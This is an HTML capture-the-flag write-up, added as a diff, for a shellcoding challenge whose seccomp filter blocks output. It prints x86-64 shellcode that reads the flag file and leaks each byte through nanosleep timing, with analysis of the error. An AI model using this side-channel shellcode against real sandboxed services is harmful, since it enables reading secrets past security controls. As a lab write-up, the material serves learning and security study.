@@ -1,0 +1,103 @@
+<!--Add date: 06/14/2021-->
+
+<h1>Shellcoding Series: Shellcode3 Solution</h1>
+
+<h2>YR81 Shellcoding Series</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Health Warning</h5>
+
+<p>This is the third stage in my shellcoding series. If you wish to try these challenges for yourself before reading the intended solution, please download them from my Github page (link at the bottom of page). If you come up with a more efficient solution, please contact me.</p>
+
+<h5>General Description</h5>
+
+<p>This challenge features shellcode that is unable to send any information back to the user - it is <i>mute</i>. In particular, all of the "write-like" syscalls, including network capabilities, have been disabled by <code>seccomp</code>. While we are still permitted to open files and read them into memory, there is no apparent way to output that memory to the user. Of course, <code>execve</code> and variants are also banned, so we cannot simply spawn a shell.</p>
+
+<img src = "./images/shellcode3_1.png"/>
+
+<p class = "caption">Figure 1. Blacklisted system calls, with write-like syscalls underlined.</p>
+
+<h5>Exploitation with Side-Channel Timing Attack</h5>
+
+<p>We can use a side-channel timing attack to leak the contents of the flag. A good high-level overview of such an attack can be found in [1]. Our approach here will be slightly different, in that we will not "guess" subsequent characters but rather deterministically learn them.</p>
+
+<p>First, we perform the usual <code>open</code> and <code>read</code> operations to get the flag contents into memory.</p>
+
+<pre class = "asm">
+sub rsp, 0x100
+mov qword ptr [rbp - 8], rdx
+mov rax, 0x67616c662f2e
+mov qword ptr [rdx], rax
+add rdx, 0x10
+mov qword ptr [rbp - 0x10], rdx
+add rdx, 0xf0
+mov qword ptr [rbp - 0x18], rdx
+mov rdi, qword ptr [rbp - 8]
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 2
+syscall
+mov qword ptr [rbp - 0x20], rax
+mov rdi, qword ptr [rbp - 0x20]
+mov rsi, qword ptr [rbp - 0x10]
+mov rdx, 0x20
+xor rax, rax
+syscall
+</pre>
+
+<p>At this point, the first 32 bytes of the flag are stored in memory at location <code>code + 0x410</code>, where <code>code</code> is the base address where the shellcode is loaded. Now suppose we want to read a certain byte. We will stall the program for a period of time approximately equal to a fraction of the value of the byte, in seconds. Suppose the first byte is the character <code>0</code>, or ascii 0x30. Using a fraction of (1 / 4), we will purposefully make the program sleep for 0x30 / 4 ~ 12 seconds before terminating the connection. Let's see how this works in shellcode:</p>
+
+<pre class = "asm">
+mov rbx, qword ptr [rbp - 0x18]
+mov rsi, qword ptr [rbp - 0x10]
+movsx rax, byte ptr [rsi + i]
+xor rdx, rdx
+mov rcx, 4
+div rcx
+mov qword ptr [rbx], rax
+mov rax, 250000000
+mul rdx
+mov qword ptr [rbx + 8], rax
+mov rdi, qword ptr [rbp - 0x18]
+xor rsi, rsi
+mov rax, 0x23
+syscall
+mov rdi, 1337
+mov rax, 0x3c
+syscall
+</pre>
+
+<p>In the above, <code>i</code> in the third line is the index of the character we wish to leak. We must run the exploit once for each character. We use the <code>nanosleep</code> syscall to get an accurate delay, followed by a clean <code>exit</code>. Below, we plot the times for the flag:</p>
+
+<img src = "./images/shellcode3_2.png"/>
+
+<p class = "caption">Figure 2. Times for remote service to close the pipe.</p>
+
+<p>Indeed, multiplying these times by 4, rounding to the nearest integer, and converting to characters gives <code>yr91{byamb4_beats`goat~</code>, which resembles a flag. The actual flag is <code>yr81{byamb4_beats_goat}</code>, so there were errors in 3 of the 23 chacters. Even so, the errors are not large: <code>9</code> is merely 1 above <code>8</code>, <code>`</code> is 1 above <code>_</code>, and <code>~</code> is 1 above <code>}</code>. This indicates that some extraneous delays in the process caused just enough error to disrupt the timing prediction. These errors are not altogether undetectable; we can plot the error between the measured time and the predicted character code divided by 4:</p>
+
+<img src = "./images/shellcode3_3.png"/>
+
+<p class = "caption">Figure 3. Prediction errors for delay times.</p>
+
+<p>The three incorrectly-predicted characters have measured times that were <i>shorter</i> than one quarter of the predicted codes. According to the <code>nanosleep</code> documentation,</p>
+
+<img class = "small" src = "./images/shellcode3_4.png"/>
+
+<p class = "caption">Figure 4. <code>nanosleep</code> system call manual notes.</p>
+
+<p>So, it should <i>never</i> be the case that the measured delay is smaller than the requested delay. Therefore, the correct predictor should not be from rounding, but rather from flooring. Using flooring, we indeed get the correct flag <code>yr81{byamb4_beats_goat}</code>.</p>
+
+<p>From Fig. 4, it is also apparent that the combined network delays and delays accumulated from parts of the remote process not in the <code>nanosleep</code> part of the shellcode (which should be small relative to network delays) amount to ~79 ms. This will of course be different for different clients and servers, but once it is known, it can be subtracted from the measured times to get a better estimate of the actual sleep time. (Be careful - using the truncation predictor, the subtracted offset should be small enough so that it does not flip the sign of the error on any of the bytes!) This allows for higher data throughput if the variance can be reduced to below the discretization of (1 / N) seconds, where N is the multiplier (4 in our case). That wasn't necessary in our case, where the flag is only but ~20 bytes, but for large files, the shellcode here will likely be inappropriately slow.</p>
+
+<h4>Acknowledgements</h4>
+
+<p>Thanks to <code>@Shunt</code> for hosting the challenge for remote testing.</p>
+
+<h4>References</h4>
+
+<ol>
+    <li><p>mCoding, <a href = "https://www.youtube.com/watch?v=XThL0LP3RjY" target = "_blank">Time to Hack - Cracking passwords using only timing information</a>.</p></li>
+</ol>
